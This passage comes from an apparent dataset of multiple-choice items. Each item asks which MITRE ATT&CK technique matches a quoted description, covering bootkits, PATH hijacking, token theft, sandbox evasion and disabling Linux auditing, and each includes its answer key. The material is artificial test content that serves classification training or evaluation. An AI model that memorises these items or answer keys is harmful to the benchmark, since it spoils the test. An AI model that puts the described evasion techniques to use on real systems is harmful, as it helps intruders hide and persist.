    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command.",
      "options": "A. Search Closed Sources: Threat Intel Vendors, B. Gather Victim Host Information: Firmware, C. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, D. Indicator Removal: Network Share Connection Removal",
      "choice": "D. Indicator Removal: Network Share Connection Removal",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. \n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.\nA. Obfuscated Files or Information: Command Obfuscation, B. Event Triggered Execution: Component Object Model Hijacking, C. Multi-Stage Channels, D. Pre-OS Boot: Bootkit",
    "context": "",
    "output": "D. Pre-OS Boot: Bootkit",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. \n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
      "options": "A. Obfuscated Files or Information: Command Obfuscation, B. Event Triggered Execution: Component Object Model Hijacking, C. Multi-Stage Channels, D. Pre-OS Boot: Bootkit",
      "choice": "D. Pre-OS Boot: Bootkit",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application).\nA. Audio Capture, B. Acquire Infrastructure: Virtual Private Server, C. Active Scanning: Vulnerability Scanning, D. Stage Capabilities: Upload Malware",
    "context": "",
    "output": "C. Active Scanning: Vulnerability Scanning",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application).",
      "options": "A. Audio Capture, B. Acquire Infrastructure: Virtual Private Server, C. Active Scanning: Vulnerability Scanning, D. Stage Capabilities: Upload Malware",
      "choice": "C. Active Scanning: Vulnerability Scanning",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter.\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification, or modifying the `/etc/paths.d` folder contents.\nA. Hijack Execution Flow: Path Interception by PATH Environment Variable, B. Data Obfuscation: Junk Data, C. Masquerading, D. Phishing for Information: Spearphishing Voice\nAnswer:",
    "context": "",
    "output": "A. Hijack Execution Flow: Path Interception by PATH Environment Variable",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter.\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification, or modifying the `/etc/paths.d` folder contents.",
      "options": "A. Hijack Execution Flow: Path Interception by PATH Environment Variable, B. Data Obfuscation: Junk Data, C. Masquerading, D. Phishing for Information: Spearphishing Voice",
      "choice": "A. Hijack Execution Flow: Path Interception by PATH Environment Variable",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate.\n\nPossible answers:\nA. Account Access Removal, B. Traffic Signaling: Socket Filters, C. Virtualization/Sandbox Evasion: User Activity Based Checks, D. Command and Scripting Interpreter: Cloud API",
    "context": "",
    "output": "C. Virtualization/Sandbox Evasion: User Activity Based Checks",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate.",
      "options": "A. Account Access Removal, B. Traffic Signaling: Socket Filters, C. Virtualization/Sandbox Evasion: User Activity Based Checks, D. Command and Scripting Interpreter: Cloud API",
      "choice": "C. Virtualization/Sandbox Evasion: User Activity Based Checks",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via Vulnerabilities to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).\n\nOptions:\nA. Develop Capabilities: Exploits, B. Server Software Component: Transport Agent, C. File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, D. System Script Proxy Execution: PubPrn",
    "context": "",
    "output": "A. Develop Capabilities: Exploits",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via Vulnerabilities to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).",
      "options": "A. Develop Capabilities: Exploits, B. Server Software Component: Transport Agent, C. File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, D. System Script Proxy Execution: PubPrn",
      "choice": "A. Develop Capabilities: Exploits",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing).\n\nPossible answers:\nA. Application Layer Protocol: Web Protocols, B. Gather Victim Org Information: Identify Roles, C. Stage Capabilities, D. Steal Application Access Token",
    "context": "",
    "output": "B. Gather Victim Org Information: Identify Roles",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing).",
      "options": "A. Application Layer Protocol: Web Protocols, B. Gather Victim Org Information: Identify Roles, C. Stage Capabilities, D. Steal Application Access Token",
      "choice": "B. Gather Victim Org Information: Identify Roles",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.\nA. Debugger Evasion, B. Steal or Forge Authentication Certificates, C. Encrypted Channel: Symmetric Cryptography, D. Access Token Manipulation",
    "context": "",
    "output": "D. Access Token Manipulation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
      "options": "A. Debugger Evasion, B. Steal or Forge Authentication Certificates, C. Encrypted Channel: Symmetric Cryptography, D. Access Token Manipulation",
      "choice": "D. Access Token Manipulation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS). Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Search Victim-Owned Websites or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).\n\nPossible answers:\nA. Search Open Technical Databases: DNS/Passive DNS, B. Internal Spearphishing, C. Modify Cloud Compute Infrastructure: Revert Cloud Instance, D. System Binary Proxy Execution: Regsvr32",
    "context": "",
    "output": "A. Search Open Technical Databases: DNS/Passive DNS",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS). Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Search Victim-Owned Websites or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
      "options": "A. Search Open Technical Databases: DNS/Passive DNS, B. Internal Spearphishing, C. Modify Cloud Compute Infrastructure: Revert Cloud Instance, D. System Binary Proxy Execution: Regsvr32",
      "choice": "A. Search Open Technical Databases: DNS/Passive DNS",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.\n\nAdversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.\n\nFor example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down. Adversaries may also extend system lock screen timeout settings. Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.\n\nAware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.\n\nA. Power Settings, B. File and Directory Permissions Modification, C. Indicator Removal: Clear Persistence, D. System Binary Proxy Execution: Mshta\nAnswer:",
    "context": "",
    "output": "A. Power Settings",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.\n\nAdversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.\n\nFor example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down. Adversaries may also extend system lock screen timeout settings. Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.\n\nAware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.",
      "options": "A. Power Settings, B. File and Directory Permissions Modification, C. Indicator Removal: Clear Persistence, D. System Binary Proxy Execution: Mshta",
      "choice": "A. Power Settings",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nA. Impair Defenses, B. Traffic Signaling: Port Knocking, C. System Script Proxy Execution: SyncAppvPublishingServer, D. Input Capture: Credential API Hooking\nAnswer:",
    "context": "",
    "output": "B. Traffic Signaling: Port Knocking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
      "options": "A. Impair Defenses, B. Traffic Signaling: Port Knocking, C. System Script Proxy Execution: SyncAppvPublishingServer, D. Input Capture: Credential API Hooking",
      "choice": "B. Traffic Signaling: Port Knocking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\n\nPossible answers:\nA. Event Triggered Execution, B. Lateral Tool Transfer, C. Traffic Signaling: Socket Filters, D. Data Manipulation: Transmitted Data Manipulation",
    "context": "",
    "output": "D. Data Manipulation: Transmitted Data Manipulation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "options": "A. Event Triggered Execution, B. Lateral Tool Transfer, C. Traffic Signaling: Socket Filters, D. Data Manipulation: Transmitted Data Manipulation",
      "choice": "D. Data Manipulation: Transmitted Data Manipulation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with Windows Management Instrumentation.\nA. Obtain Capabilities, B. Remote Services: Distributed Component Object Model, C. Boot or Logon Initialization Scripts: Logon Script (Windows), D. Financial Theft",
    "context": "",
    "output": "B. Remote Services: Distributed Component Object Model",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with Windows Management Instrumentation.",
      "options": "A. Obtain Capabilities, B. Remote Services: Distributed Component Object Model, C. Boot or Logon Initialization Scripts: Logon Script (Windows), D. Financial Theft",
      "choice": "B. Remote Services: Distributed Component Object Model",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may rent Virtual Private Servers (VPSs)\u00a0that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.\n\nA. File and Directory Discovery, B. Application Layer Protocol: Web Protocols, C. Search Closed Sources: Purchase Technical Data, D. Acquire Infrastructure: Virtual Private Server\nAnswer:",
    "context": "",
    "output": "D. Acquire Infrastructure: Virtual Private Server",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may rent Virtual Private Servers (VPSs)\u00a0that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.",
      "options": "A. File and Directory Discovery, B. Application Layer Protocol: Web Protocols, C. Search Closed Sources: Purchase Technical Data, D. Acquire Infrastructure: Virtual Private Server",
      "choice": "D. Acquire Infrastructure: Virtual Private Server",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.\nA. OS Credential Dumping: Security Account Manager, B. Masquerading: Masquerade File Type, C. User Execution: Malicious Link, D. Impair Defenses: Disable or Modify Linux Audit System",
    "context": "",
    "output": "D. Impair Defenses: Disable or Modify Linux Audit System",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.",
      "options": "A. OS Credential Dumping: Security Account Manager, B. Masquerading: Masquerade File Type, C. User Execution: Malicious Link, D. Impair Defenses: Disable or Modify Linux Audit System",
      "choice": "D. Impair Defenses: Disable or Modify Linux Audit System",
